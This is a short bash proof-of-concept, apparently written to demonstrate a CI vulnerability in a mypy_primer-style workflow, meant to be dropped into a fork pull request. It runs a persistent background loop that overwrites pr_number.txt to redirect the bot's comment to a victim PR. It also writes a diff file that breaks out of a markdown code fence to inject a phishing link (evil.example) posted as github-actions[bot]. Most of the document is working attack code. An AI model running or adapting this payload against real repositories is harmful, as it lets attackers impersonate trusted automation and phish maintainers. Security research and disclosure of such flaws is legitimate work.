#!/usr/bin/env bash
# ATTACKER payload for the pyrefly mypy_primer-class variant. In the fork PR, replace
# scripts/mp-run.sh with this. Runs during the producer's build step (attacker code),
# BEFORE the trusted "Save PR number". (1) starts a persistent background loop that
# overwrites pr_number.txt with the VICTIM PR number (survives across steps, beats the
# later trusted one-shot write). (2) writes fulldiff.txt containing a ``` that BREAKS
# OUT of the consumer's ```diff fence, followed by injected markdown that renders
# outside the code block.
#
# ---- set to the victim PR number ----
VICTIM_PR=1
# -------------------------------------
setsid bash -c "while true; do echo ${VICTIM_PR} > pr_number.txt; sleep 0.1; done" >/dev/null 2>&1 &

cat > fulldiff.txt <<'EOF'
+benign looking diff line
```
## INJECTED: fork PR broke out of the ```diff fence
[phishing link](https://evil.example) — this markdown rendered OUTSIDE the code block,
posted as github-actions[bot] on an unrelated victim PR.
EOF
echo "mp-run(attacker): bg overwrite -> victim PR ${VICTIM_PR}; fence-breakout payload written"
